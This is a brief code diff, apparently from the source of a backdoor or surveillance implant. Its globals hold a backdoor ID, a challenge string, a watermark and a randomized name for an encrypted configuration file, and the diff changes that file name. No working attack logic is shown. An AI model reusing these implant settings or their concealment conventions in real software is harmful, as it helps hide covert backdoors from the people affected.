@@ -62,7 +62,7 @@ BYTE g_BackdoorID[] = "EMp7Ca7-fpOBIr\x00\x00";
 BYTE g_Challenge[] = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ";
 
 // Nome del file di configurazione CIFRATO con il primo byte di g_Challenge[]
-WCHAR g_ConfName[] = L"cptm511.dql";
+WCHAR g_ConfName[] = L"fmh58t4.wph";
 
 // Watermark
 BYTE g_Watermark[] = "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW";
